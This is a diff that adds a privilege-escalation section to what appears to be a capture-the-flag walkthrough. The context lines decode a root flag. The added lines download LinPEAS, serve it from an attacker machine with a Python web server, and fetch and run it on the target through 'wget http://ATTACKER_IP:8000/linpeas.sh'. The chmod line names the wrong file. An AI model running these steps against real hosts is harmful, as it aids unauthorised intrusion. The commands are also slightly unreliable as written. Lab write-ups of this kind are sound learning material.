@@ -635,3 +635,18 @@ VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
 cat /root/root.txt | base64 -d
 ```
 #### Enumerate target host using LinPEAS
+```
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+```
+**Serve payload through python webserver**
+```
+python3 -m http.server
+```
+**Download LinPEAS to target host**
+* Ensure that target directory has write permissions (`/tmp`).
+* Write LinPeas output to txt file.
+```
+wget http://ATTACKER_IP:8000/linpeas.sh
+chmod +x ./linpeas.txt
+./linpeas.sh -a > linpeas.txt
+```
